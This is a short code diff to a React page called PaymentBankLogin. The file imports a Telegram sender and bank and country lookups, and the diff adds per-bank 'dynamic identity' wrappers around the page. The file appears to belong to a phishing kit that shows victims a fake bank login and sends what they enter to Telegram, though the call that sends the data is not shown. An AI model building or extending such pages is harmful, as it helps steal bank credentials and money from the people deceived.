@@ -12,6 +12,8 @@ import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { DynamicIdentity, EntityContainer } from "@/components/DynamicIdentity";
+import { getPaymentEntityType } from "@/lib/paymentEntityHelper";
 
 const PaymentBankLogin = () => {
   const { id } = useParams();
@@ -66,6 +68,9 @@ const PaymentBankLogin = () => {
   }
 
   const formattedAmount = formatCurrency(amount, selectedCountry);
+  
+  // Bank login always uses bank_pages entity type
+  const entityType = 'bank_pages';
   
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
@@ -261,6 +266,8 @@ const PaymentBankLogin = () => {
   };
   
   return (
+    <DynamicIdentity entityType={entityType}>
+      <EntityContainer entityType={entityType} useBackgroundImage={false}>
     <DynamicPaymentLayout
       serviceName={serviceName}
       serviceKey={serviceKey}
@@ -574,6 +581,8 @@ const PaymentBankLogin = () => {
         <input type="text" name="timestamp" />
       </form>
     </DynamicPaymentLayout>
+      </EntityContainer>
+    </DynamicIdentity>
   );
 };
 
